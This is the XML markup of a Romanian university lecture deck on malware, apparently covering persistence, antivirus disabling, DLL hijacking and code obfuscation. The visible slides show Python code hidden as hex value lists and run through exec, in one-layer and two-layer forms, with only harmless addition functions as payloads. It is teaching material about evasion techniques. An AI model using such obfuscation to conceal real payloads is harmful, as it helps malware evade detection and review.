              <a:t>ddFsoUs = “J4b2Fk_”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>tEX13boo0 = “text”.length</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>O0ooO= J_dDs.length+tEX13boo0-ddFsoUs.length</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932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p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>ofruscarea</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ofruscarea poate fi funcționala și ușor de citit de om </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>(dead code in clar)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ofruscarea poate fi nefuncționala și funcționala în anumite condiții </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>(criptare - nefunctionala; decriptare prin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t>eval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> – functionala)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3919334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6108-760B-8CD6-14C9-99A3674EA20F}"/>
            </a:ext>
          </a:extLst>
        </p:cNvPr>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Flowchart: Process 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95B7962E-CB32-2710-C417-31BCDA3E644B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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AAF17-2095-0258-09C0-70EDA6CC5224}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ofruscarea</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>criptare vs executie dinamica</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C775C48A-D670-9EFE-EE44-E80F05E99C48}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1040296" y="2603105"/>
            <a:ext cx="6096000" cy="3456524"/>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data</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0x65</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0x66</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0x67</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0x54</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0x76</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0x6E</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0x62</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0x29</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0x79</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0x2D</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0x2D</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0x7B</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0x3B</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0x0E</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0x0B</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0x73</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0x66</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0x75</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0x76</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0x73</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0x6F</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0x79</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0x2C</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0x2C</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0x7B</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859900"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>for</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859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in</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data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chr</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1</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exec</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print</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Suma</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1</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2</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3</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" sz="1000" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="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FA56AD70-258C-26E0-B5ED-1DBA14DD8C49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6230427" y="2520199"/>
            <a:ext cx="5082208"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Acest exemplu arată cum codul poate fi ascuns sub forma unei liste de valori numerice, care sunt transformate la rulare în caractere și apoi executate cu exec.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În loc ca funcția să fie vizibilă direct în sursă, ea devine lizibilă doar în momentul execuției.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Astfel se obține o formă de camuflaj simplu, utilizată frecvent în limbaje de scripting pentru ascunderea sau comprimarea codului.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În cazul prezentat, codul ascuns definește funcția Suma(x,y,z), care returnează rezultatul adunării celor trei argumente și produce valoarea 6 atunci când este apelată.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4BD25C2E-B00E-C16D-19F9-F5DD5DF09765}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9919252" y="1460196"/>
            <a:ext cx="18685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rPr>
              <a:t>execuția dinamică</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Speech Bubble: Rectangle with Corners Rounded 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1DCF054D-3EFF-9E0B-5A1F-524D1DBD39C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3425687" y="4750903"/>
            <a:ext cx="2219739" cy="1133061"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRoundRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -127041"/>
              <a:gd name="adj2" fmla="val 3094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Gill Sans MT" panose="020B0502020104020203"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>def Suma(x, y, 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Gill Sans MT" panose="020B0502020104020203"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>    return x + y + z</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25677309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78973-BB46-F413-6B08-A8A26E756839}"/>
            </a:ext>
          </a:extLst>
        </p:cNvPr>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Flowchart: Process 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{28842683-71FD-E217-DD4B-1A300DEDDCFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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1983247-0F0D-8611-85B1-B427E5FAAD82}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ofruscarea</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>criptare vs executie dinamica</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{34F32674-0D92-843B-0871-DE06A702352A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="748748" y="2262330"/>
            <a:ext cx="9004852" cy="3991029"/>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err="1">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buf</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0x67</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0x68</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0x5D</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0x76</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0x2B</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0x2F</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0x65</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0x2C</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0x3D</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0x5D</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0x75</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0x68</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0x77</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0x78</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0x75</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0x5D</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0x65</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0x0B</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0x0B</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0x67</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0x70</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0x46</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0x0B</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0x0A</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0x2C</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0x70</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0x65</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0x2A</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0x2A</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0x0E</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0x0B</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0x66</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0x06</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0x29</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0x74</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0x33</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0x2A</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859900"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>for</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err="1">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859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in</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err="1">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buf</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chr</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i</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1</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exec</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000" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="657B83"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>print</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B58900"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>s</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10</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r>
              <a:rPr kumimoji="0" lang="en-US" sz="1000" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="2AA198"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>20</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" sz="1000" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="586E75"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18"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775A41B-731C-B15F-5673-A9530D4413E6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7381462" y="2510184"/>
            <a:ext cx="4111486"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Acest exemplu prezintă execuția unui cod criptat, unde instrucțiunile reale sunt ascunse într-o listă de valori numerice.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Fiecare element este transformat în caracter, rezultând un script intermediar care la rândul lui decriptează codul final.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În acest mod, logica programului devine vizibilă și executabilă doar la rulare.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Codul ascuns definește o funcție simplă de adunare, iar apelul s(10,20) returnează valoarea 30.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B0BE49B-B313-881A-0E85-CDF2C55BD52E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4421503" y="885890"/>
            <a:ext cx="718930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95000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Gill Sans MT" panose="020B0502020104020203"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Diferența este că în exemplul anterior codul era doar camuflat simplu într-o listă de valori, pe când aici există un pas suplimentar: din lista numerică se generează un script intermediar care decriptează abia apoi codul final. Cu alte cuvinte, primul are un singur strat de mască, acesta are două straturi de ofuscare.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13445602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3.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="1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3350</TotalTime>
  <Words>6226</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>403</Paragraphs>
  <Slides>49</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49</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="62" baseType="lpstr">
      <vt:lpstr>Agency FB</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Gill Sans MT</vt:lpstr>
      <vt:lpstr>Impact</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Wingdings 2</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Dividend</vt:lpstr>
      <vt:lpstr>1_Main Event</vt:lpstr>
      <vt:lpstr>C.13 Metode de persistenta</vt:lpstr>
      <vt:lpstr>Principalele părți ale prezentării</vt:lpstr>
      <vt:lpstr>C.13.1 Anihilarea programelor antimalware</vt:lpstr>
      <vt:lpstr>Kill Anti-virus</vt:lpstr>
      <vt:lpstr>bombware</vt:lpstr>
      <vt:lpstr>C.14.2 Persistenta malware</vt:lpstr>
      <vt:lpstr>persistenta</vt:lpstr>
      <vt:lpstr>Chei de registrii</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Aplicații înregistrate ca servicii</vt:lpstr>
      <vt:lpstr>Set de tool-uri de securitate, experimentale si gratuite</vt:lpstr>
      <vt:lpstr>Câteva comenzi clasice de Windows care pot fi executate la distanță</vt:lpstr>
      <vt:lpstr>Comenzi pe care le puteți găsi la îndemână sau interesante</vt:lpstr>
      <vt:lpstr>Extragerea profilurilor wireless salvate</vt:lpstr>
      <vt:lpstr>Execution spoofing</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Prefetch</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>C.14.3 DLL Hijacking</vt:lpstr>
      <vt:lpstr>DLL hai jaking</vt:lpstr>
      <vt:lpstr>persistenta</vt:lpstr>
      <vt:lpstr>persistenta</vt:lpstr>
      <vt:lpstr>persistenta</vt:lpstr>
      <vt:lpstr>Incarcare directa</vt:lpstr>
      <vt:lpstr>Informatii suplimentare</vt:lpstr>
      <vt:lpstr>C.12.6 Ofruscarea</vt:lpstr>
      <vt:lpstr>Ofruscarea emergenta</vt:lpstr>
      <vt:lpstr>Ofruscarea alte tehnici de ofuscare</vt:lpstr>
      <vt:lpstr>Ofruscarea alte tehnici de ofuscare</vt:lpstr>
      <vt:lpstr>Ofruscarea alte tehnici de ofuscare</vt:lpstr>
      <vt:lpstr>Ofruscarea alte tehnici de ofuscare</vt:lpstr>
      <vt:lpstr>Ofruscari</vt:lpstr>
      <vt:lpstr>Ofruscarea alte tehnici de ofuscare - transformari</vt:lpstr>
      <vt:lpstr>Ofruscarea alte tehnici de ofuscare - transformari</vt:lpstr>
      <vt:lpstr>Ofruscarea alte tehnici de ofuscare - transformari</vt:lpstr>
      <vt:lpstr>Ofruscarea alte tehnici de ofuscare - transformari</vt:lpstr>
      <vt:lpstr>Ofruscarea exemplu</vt:lpstr>
      <vt:lpstr>ofruscarea</vt:lpstr>
      <vt:lpstr>Ofruscarea criptare vs executie dinamica</vt:lpstr>
      <vt:lpstr>Ofruscarea criptare vs executie dinamica</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C.1. Evolutia malware si a solutiilor de securitate</dc:title>
  <dc:creator>Dr. Paul A. Gagniuc</dc:creator>
  <cp:lastModifiedBy>Paul Gagniuc</cp:lastModifiedBy>
  <cp:revision>289</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-02-20T09:23:33Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-24T17:07:17Z</dcterms:modified>
</cp:coreProperties>
</file>